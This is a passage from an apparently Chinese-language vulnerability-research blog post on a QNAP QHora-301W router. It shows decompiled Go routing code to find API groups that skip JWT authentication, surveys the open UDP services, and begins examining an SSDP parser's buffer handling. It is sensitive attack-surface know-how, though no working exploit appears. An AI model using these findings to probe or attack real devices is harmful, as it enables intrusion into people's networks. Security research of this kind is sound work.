<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">void miro-webserver/routes/qhora_301w.InitRouters(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  code *pcVar1;</span><br><span class="line">  long unaff_x28;</span><br><span class="line">  code **ppcVar2;</span><br><span class="line">  undefined8 in_stack_ffffffffffffffa8;</span><br><span class="line">  undefined8 uVar3;</span><br><span class="line">  undefined8 uVar4;</span><br><span class="line">  code **local_20;</span><br><span class="line">  code **local_18;</span><br><span class="line">  undefined **local_10 [<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  while (local_10 &lt;= *(undefined ****)(unaff_x28 + <span class="number">0x10</span>)) &#123;</span><br><span class="line"> </span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group</span><br><span class="line">            (param_1,&amp;DAT_00faeafc,<span class="number">0xc</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,in_stack_ffffffffffffffa8);</span><br><span class="line">  ppcVar2 = (code **)&amp;DAT_00fab878;</span><br><span class="line">  uVar3 = in_stack_ffffffffffffffa8;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group</span><br><span class="line">            (in_stack_ffffffffffffffa8,&amp;DAT_00fab878,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,in_stack_ffffffffffffffa8);</span><br><span class="line">  miro-webserver/routes/qhora_301w.regEngineerAPIs(uVar3); <span class="comment">//[1]</span></span><br><span class="line">  pcVar1 = DAT_017fa308;</span><br><span class="line">  runtime.newobject(&amp;DAT_00edd940,ppcVar2);</span><br><span class="line">  *ppcVar2 = miro-webserver/routes/qhora_301w.InitRouters.func1; <span class="comment">//[9]</span></span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    ppcVar2[<span class="number">1</span>] = pcVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  local_10[<span class="number">0</span>] = &amp;PTR_miro-webserver/controllers/api/login.CheckInitState_0102f278;</span><br><span class="line">  local_18 = ppcVar2;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group</span><br><span class="line">            (in_stack_ffffffffffffffa8,&amp;DAT_00fa519e,<span class="number">3</span>,&amp;local_18,<span class="number">2</span>,<span class="number">2</span>,uVar3);</span><br><span class="line">              </span><br><span class="line">  miro-webserver/routes/qhora_301w.regV1InitAPIs(uVar3); <span class="comment">//[2]</span></span><br><span class="line">              </span><br><span class="line">  ppcVar2 = (code **)&amp;DAT_00fa519e;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group</span><br><span class="line">            (in_stack_ffffffffffffffa8,&amp;DAT_00fa519e,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,uVar3);</span><br><span class="line">               </span><br><span class="line">  miro-webserver/routes/qhora_301w.regV1NonAuthAPIs(uVar3); <span class="comment">//[3]</span></span><br><span class="line">  pcVar1 = DAT_017fa300;</span><br><span class="line"></span><br><span class="line">  runtime.newobject(&amp;DAT_00edd940,ppcVar2);</span><br><span class="line">  *ppcVar2 = miro-webserver/routes/qhora_301w.InitRouters.func2; <span class="comment">//[10]</span></span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    ppcVar2[<span class="number">1</span>] = pcVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  local_20 = ppcVar2;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group</span><br><span class="line">            (in_stack_ffffffffffffffa8,&amp;DAT_00fa519e,<span class="number">3</span>,&amp;local_20,<span class="number">1</span>,<span class="number">1</span>,uVar3);</span><br><span class="line">  uVar4 = uVar3;</span><br><span class="line"></span><br><span class="line">  miro-webserver/routes/qhora_301w.regV1APIs(uVar3); <span class="comment">//[4]</span></span><br><span class="line">  </span><br><span class="line">  ppcVar2 = (code **)((long)&amp;DAT_00fa519e + <span class="number">3</span>);</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group(in_stack_ffffffffffffffa8,<span class="number">0xfa51a1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,uVar4);</span><br><span class="line">  </span><br><span class="line">  miro-webserver/routes/qhora_301w.regV2NonAuthAPIs(uVar4); <span class="comment">//[5]</span></span><br><span class="line">  pcVar1 = DAT_017fa300;</span><br><span class="line">   </span><br><span class="line">  runtime.newobject(&amp;DAT_00edd940,ppcVar2);</span><br><span class="line">  *ppcVar2 = miro-webserver/routes/qhora_301w.InitRouters.func3; <span class="comment">//[11]</span></span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    ppcVar2[<span class="number">1</span>] = pcVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  local_20 = ppcVar2;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).Group</span><br><span class="line">            (in_stack_ffffffffffffffa8,<span class="number">0xfa51a1</span>,<span class="number">3</span>,&amp;local_20,<span class="number">1</span>,<span class="number">1</span>,uVar4);</span><br><span class="line"></span><br><span class="line">  miro-webserver/routes/qhora_301w.regV2APIs(uVar4); <span class="comment">//[6]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((DAT_017fc688 == <span class="number">2</span>) &amp;&amp; (*(short *)DAT_017fc680 == <span class="number">0x7061</span>)) &#123;</span><br><span class="line">  </span><br><span class="line">    miro-webserver/routes/qhora_301w.regV1APModeAPIs(uVar3); <span class="comment">//[7]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((DAT_017fc688 == <span class="number">6</span>) &amp;&amp;</span><br><span class="line">       ((*DAT_017fc680 == <span class="number">0x74756f72</span> &amp;&amp; (*(short *)(DAT_017fc680 + <span class="number">1</span>) == <span class="number">0x7265</span>)))) &#123;</span><br><span class="line">     </span><br><span class="line">      miro-webserver/routes/qhora_301w.regV1RouterModeAPIs(uVar3); <span class="comment">//[8]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>可以看到在[1],[2],[3],[4],[5],[6],[7],[8], 分别调用了api处理函数, 权限鉴定的地方就在[9],[10],[11]处, 当进入函数后可以看到<code>github.com/appleboy/gin-jwt/v2.(*GinJWTMiddleware).middlewareImpl</code>,现在我们可以回头来看gin-jwt, 在验证权限时会调用<code>MiddlewareFunc</code>而本质上是调用<code>middlewareImpl</code></p>
</blockquote>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mw *GinJWTMiddleware)</span></span> MiddlewareFunc() gin.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		mw.middlewareImpl(c)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>所以我们只需要看那些<code>github.com/gin-gonic/gin.(*RouterGroup).Group</code>中没有调用middlewareImpl就可以知道那些接口不需要权限认证</p>
</blockquote>
<blockquote>
<p>可以看到[2]处上面的Group的<code>local_18</code>参数来自于<code>ppcVar2</code>而<code>ppcVar2</code>来自于<code>miro-webserver/routes/qhora_301w.InitRouters.func1</code>, 而不需要鉴权的接口是[3]也就是<code>regV1NonAuthAPIs</code>我们也可以通过函数名称看出来, Gorup的第四个参数也设置为0.</p>
</blockquote>
<blockquote>
<p>随便进入一个api函数<code>miro-webserver/routes/qhora_301w.regV1InitAPIs</code></p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> miro-webserver/routes/qhora_301w.regV1InitAPIs(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (&amp;stack0x00000000 &lt;= *(undefined **)(unaff_x28 + <span class="number">0x10</span>)) &#123;</span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,in_stack_ffffffffffffffb0);</span><br><span class="line">  *in_stack_ffffffffffffffb0 = &amp;PTR_miro-webserver/controllers/api/firmware.FwUpgradeAPI_0102f1c8; <span class="comment">//[1]</span></span><br><span class="line"></span><br><span class="line">  puVar1 = (undefined8 *)&amp;DAT_00fa52f1;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).handle</span><br><span class="line">            (param_1,<span class="string">&quot;PUT&quot;</span>,<span class="number">3</span>,<span class="string">&quot;/initial/firmware&quot;</span>,<span class="number">0x11</span>,in_stack_ffffffffffffffb0,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">             in_stack_ffffffffffffffe8,in_stack_fffffffffffffff0);</span><br><span class="line"></span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,puVar1);</span><br><span class="line">  *puVar1 = &amp;PTR_miro-webserver/controllers/api/firmware.GetLocalFwInfoAPI_0102f1e0; <span class="comment">//[2]</span></span><br><span class="line"></span><br><span class="line">  pcVar2 = s_GET_00fa5267;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).handle</span><br><span class="line">            (param_1,<span class="string">&quot;GET&quot;</span>,<span class="number">3</span>,<span class="string">&quot;/initial/firmware&quot;</span>,<span class="number">0x11</span>,puVar1,<span class="number">1</span>,<span class="number">1</span>,in_stack_ffffffffffffffe8,</span><br><span class="line">             in_stack_fffffffffffffff0);</span><br><span class="line"></span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,pcVar2);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>现在我们可以看到路径和请求方法了,前面我提到过跟官方的示例有一点不同，但是如果你跟入<code>r.GET</code>就会发现为什么了, 可能在Ghidra分析时会直接到核心函数, 大部分的分析我都是根据代码逻辑和函数名称去猜，找到了黑盒测试的感觉.</p>
</blockquote>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可以看到GET也是调用了group.handle</span></span><br><span class="line"><span class="comment">// GET is a shortcut for router.Handle(&quot;GET&quot;, path, handlers).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(group *RouterGroup)</span></span> GET(relativePath <span class="type">string</span>, handlers ...HandlerFunc) IRoutes &#123;</span><br><span class="line">	<span class="keyword">return</span> group.handle(http.MethodGet, relativePath, handlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>而对应的调用函数, 细心的师傅可能已经发现了就是[1],[2]处 , <code>FwUpgradeAPI</code> and <code>GetLocalFwInfoAPI</code></p>
</blockquote>
<blockquote>
<p>我们初步的总结的无需授权的接口和需要授权的接口如下</p>
</blockquote>
<ol>
<li>需要认证</li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qhora_301w.regEngineerAPIs()</span><br><span class="line">qhora_301w.regV1InitAPIs()</span><br><span class="line">qhora_301w.regV1APIs()</span><br><span class="line">qhora_301w.regV2APIs()</span><br><span class="line">qhora_301w.regV1APModeAPIs()</span><br><span class="line">qhora_301w.regV1RouterModeAPIs()</span><br><span class="line"></span><br><span class="line">qhora_301w.regInternalAPIs()<span class="comment">//这个路由貌似只有在debugmode时启用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<ol start="2">
<li>不需要认证</li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qhora_301w.regV1NonAuthAPIs()</span><br><span class="line">qhora_301w.regV2NonAuthAPIs()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>常见请求url两个,<code>/miro/api/v2/*</code> and <code>/miro/api/v1/*</code>,还有一个内部请求使用的路径，但是本质上没有区别. 如果我们想Call到<code>GetLocalFwInfoAPI</code>就需要<code>GET /miro/api/v1/initial/firmware</code>.</p>
</blockquote>
<blockquote>
<p>web的基本分析已经结束了, 对于其他的不感兴趣可以直接跳到漏洞分析.</p>
</blockquote>
<h3 id="systemd-resolved-服务-5355端口"><a href="#systemd-resolved-服务-5355端口" class="headerlink" title="systemd-resolved 服务 5355端口"></a>systemd-resolved 服务 5355端口</h3><blockquote>
<p>这个没有什么可以看的, DNS缓存服务而开放的5355端口是LLMNR服务(链路本地多播名称解析), 具体信息可以看<a class="link"   target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/Systemd-resolved%E5%92%8Chttps://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution" >https://wiki.archlinux.org/title/Systemd-resolved和https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 我并没有去过多的去看，因为看起来是一个成熟的服务.</p>
</blockquote>
<h3 id="charon-服务-4500-500端口"><a href="#charon-服务-4500-500端口" class="headerlink" title="charon 服务 4500,500端口"></a>charon 服务 4500,500端口</h3><blockquote>
<p><code>charon</code>进程是<code>strongswan</code>中的核心进程序,开源的基于IPsec的VPN解决方案, 看上去又是一个成熟的第三方服务, 简单的看了一下历史漏洞貌似并没有我能够利用的,也尝试搜索了一下厂商都关键字没有找到特征, 所以我跳过了这个程序.<br>(可以看一下是否对于日志有二次处理)</p>
</blockquote>
<h3 id="dm-agent服务-开放了许多端口"><a href="#dm-agent服务-开放了许多端口" class="headerlink" title="dm_agent服务 开放了许多端口"></a>dm_agent服务 开放了许多端口</h3><blockquote>
<p><code>dm_agent</code>服务只在一个设备中发现运行可能是需要单独开启的服务, 并且服务好像是由第三方为qnap开发的dpi服务,开发公司是lionic.</p>
</blockquote>
<blockquote>
<p>1900 ssdp_scan , 3702 ws_discovery_scan , 5353 mdns_scan , 8097 qnap_scan, 1234 synology_scan, <code>dm_agent</code>udp接收到的请求最后都会发送到6666的端口的<code>rapid</code> (暂不清楚是否能够在WAN口访问)</p>
</blockquote>
<blockquote>
<p>简单的来看一下处理接收数据的函数, 部分端口貌似只记录了日志比如ws_discovery_scan,</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssdp_scan function</span></span><br><span class="line"></span><br><span class="line">    uVar4 = recvfrom(__fd,&amp;local_800,<span class="number">0x800</span>,<span class="number">0</span>,local_880,&amp;local_940); <span class="comment">//[1]</span></span><br><span class="line">  &#125; <span class="keyword">while</span> ((<span class="type">int</span>)uVar4 &lt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_880[<span class="number">0</span>].sa_family != <span class="number">2</span>) <span class="keyword">goto</span> LAB_004103ac;</span><br><span class="line">  inet_ntop(<span class="number">2</span>,local_880[<span class="number">0</span>].sa_data + <span class="number">2</span>,acStack_908,<span class="number">0x10</span>);</span><br><span class="line">  iVar1 = arp_getmac(param_2,acStack_908,&amp;local_8e8); <span class="comment">//[2]</span></span><br><span class="line">  <span class="keyword">goto</span> joined_r0x00410634;</span><br><span class="line">LAB_004103ac:</span><br><span class="line">  <span class="keyword">if</span> (local_880[<span class="number">0</span>].sa_family == <span class="number">10</span>) &#123;</span><br><span class="line">    inet_ntop(<span class="number">10</span>,local_880[<span class="number">0</span>].sa_data + <span class="number">6</span>,acStack_8b0,<span class="number">0x2e</span>);</span><br><span class="line">    iVar1 = ndp_getmac(param_2,acStack_8b0,&amp;local_8e8); <span class="comment">//[3]</span></span><br><span class="line">joined_r0x00410634:</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      iVar1 = check_pkt_len(&amp;local_8e8,uVar4 &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">8</span> &lt; (<span class="type">int</span>)uVar4) &#123;</span><br><span class="line">          <span class="keyword">if</span> (develop_mode != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[SSDP] Got message size = %d, data = %02X%02X%02X%02X%02X%02X%02X%02X...\n&quot;</span>,</span><br><span class="line">                   uVar4 &amp; <span class="number">0xffffffff</span>,(ulong)local_800,(ulong)local_7ff,(ulong)local_7fe,</span><br><span class="line">                   (ulong)local_7fd,(ulong)local_7fc,(ulong)local_7fb,(uint)local_7fa,</span><br><span class="line">                   (uint)local_7f9);</span><br><span class="line">            ssdp_parser(&amp;local_800,&amp;local_8e8); <span class="comment">//[4]</span></span><br><span class="line">            <span class="keyword">goto</span> joined_r0x00410390;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (syslog_mode != <span class="number">0</span>) &#123;</span><br><span class="line">            syslog(<span class="number">7</span>,<span class="string">&quot;[SSDP] Got message size = %d, data = %02X%02X%02X%02X%02X%02X%02X%02X...\n&quot;</span>,</span><br><span class="line">                   uVar4 &amp; <span class="number">0xffffffff</span>,(ulong)local_800,(ulong)local_7ff,(ulong)local_7fe,</span><br><span class="line">                   (ulong)local_7fd,(ulong)local_7fc,(uint)local_7fb,(uint)local_7fa,(uint)local_7f9</span><br><span class="line">                  );</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ssdp_parser(&amp;local_800,&amp;local_8e8); <span class="comment">//[5]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>可以看到在[1]处获取到udpdata, 在[2]和[3]处获取来MAC地址, 并在[4]或[5]处传递给<code>ssdp_parser</code><br>进行处理</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ssdp_parser</span></span><br><span class="line"></span><br><span class="line">undefined8 <span class="title function_">ssdp_parser</span><span class="params">(<span class="type">char</span> *param_1,undefined8 param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">long</span> lVar2;</span><br><span class="line">  <span class="type">int</span> iVar3;</span><br><span class="line">  <span class="type">int</span> iVar4;</span><br><span class="line">  undefined4 *puVar5;</span><br><span class="line">  <span class="type">char</span> *pcVar6;</span><br><span class="line">  <span class="type">char</span> *pcVar7;</span><br><span class="line">  <span class="type">size_t</span> sVar8;</span><br><span class="line">  <span class="type">int</span> iVar9;</span><br><span class="line">  <span class="type">long</span> lVar10;</span><br><span class="line">  <span class="type">long</span> lVar11;</span><br><span class="line">  undefined4 *puVar12;</span><br><span class="line">  <span class="type">long</span> lVar13;</span><br><span class="line">  <span class="type">char</span> acStack_1880 [<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> acStack_1840 [<span class="number">64</span>];</span><br><span class="line">  undefined auStack_1800 [<span class="number">2048</span>];</span><br><span class="line">  undefined8 local_1000;</span><br><span class="line">  undefined8 uStack_ff8;</span><br><span class="line">  undefined auStack_ff0 [<span class="number">2032</span>];</span><br><span class="line">  undefined auStack_800 [<span class="number">2048</span>];</span><br><span class="line">  </span><br><span class="line">  local_1000 = <span class="number">0</span>;</span><br><span class="line">  uStack_ff8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_ff0,<span class="number">0</span>,<span class="number">0x7f0</span>);</span><br><span class="line">  <span class="keyword">if</span> (ssdp_protocol != <span class="number">0</span>) &#123;</span><br><span class="line">    puVar12 = *(undefined4 **)(ssdp_protocol + <span class="number">0x10</span>);</span><br><span class="line">    puVar5 = *(undefined4 **)(ssdp_protocol + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ((puVar12 != (undefined4 *)<span class="number">0x0</span>) &amp;&amp; (iVar4 = puVar12[<span class="number">1</span>], <span class="number">0</span> &lt; iVar4)) &#123;</span><br><span class="line">      lVar11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        lVar10 = *(<span class="type">long</span> *)(puVar12 + <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">memset</span>(auStack_800,<span class="number">0</span>,<span class="number">0x800</span>);</span><br><span class="line">        lVar1 = lVar10 + lVar11;</span><br><span class="line">        pcVar6 = strcasestr(param_1,*(<span class="type">char</span> **)(lVar10 + lVar11));</span><br><span class="line">        <span class="keyword">if</span> (pcVar6 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          pcVar7 = <span class="built_in">strstr</span>(pcVar6,<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">          iVar9 = (<span class="type">int</span>)pcVar7 - (<span class="type">int</span>)pcVar6;</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">0x800</span> &lt; iVar9) &#123;</span><br><span class="line">            iVar9 = <span class="number">0x800</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">memcpy</span>(auStack_800,pcVar6 + <span class="number">1</span>,(<span class="type">long</span>)iVar9);</span><br><span class="line">          auStack_800[iVar9] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">0</span> &lt; *(<span class="type">int</span> *)(lVar1 + <span class="number">8</span>)) &#123;</span><br><span class="line">            lVar10 = <span class="number">0</span>;</span><br><span class="line">            iVar9 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span> 